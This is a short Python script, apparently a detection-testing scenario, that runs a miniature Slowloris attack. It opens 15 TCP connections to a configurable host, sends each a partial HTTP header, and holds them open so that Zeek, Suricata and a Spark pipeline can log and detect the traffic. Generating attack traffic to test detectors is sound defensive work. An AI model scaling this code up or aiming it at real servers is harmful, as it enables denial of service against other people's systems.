#!/usr/bin/env python3
"""
Controlled TCP Connection Exhaustion & Slowloris Probe Scenario.
Simulates low-and-slow TCP session starvation by initiating concurrent
partially completed HTTP requests with extended keepalives.
Observed by: Zeek (conn.log long-duration sessions), Suricata
Detected by: Spark Structured Streaming (Session variance & flow accumulation)
"""

import os
import time
import socket

TARGET_HOST = os.getenv("TARGET_HOST", "localhost")
TARGET_PORT = int(os.getenv("TARGET_PORT", 3000))

def run_tcp_exhaustion(sockets_count: int = 15, duration_sec: int = 2):
    print(f"\n[!] INITIATING CONTROLLED TCP CONNECTION EXHAUSTION PROBE ({sockets_count} connections)...")
    print(f"    Target: {TARGET_HOST}:{TARGET_PORT}")
    
    sockets = []
    for i in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            # Send partial HTTP header without trailing CRLF CRLF
            s.send(f"GET /?sock={i} HTTP/1.1\r\nHost: {TARGET_HOST}\r\nUser-Agent: Mozilla/5.0 (Exhaustion-Probe)\r\n".encode("utf-8"))
            sockets.append(s)
            print(f"  [{i+1}/{sockets_count}] Established lingering TCP session #{i+1}")
        except Exception as e:
            print(f"  [{i+1}/{sockets_count}] Connection failed: {e}")
        time.sleep(0.05)
        
    print(f"[*] Holding {len(sockets)} TCP sessions open for {duration_sec}s...")
    time.sleep(duration_sec)
    
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
            
    print(f"[+] Released {len(sockets)} lingering sessions. Telemetry logged by Zeek.")
    return len(sockets)

if __name__ == "__main__":
    run_tcp_exhaustion()
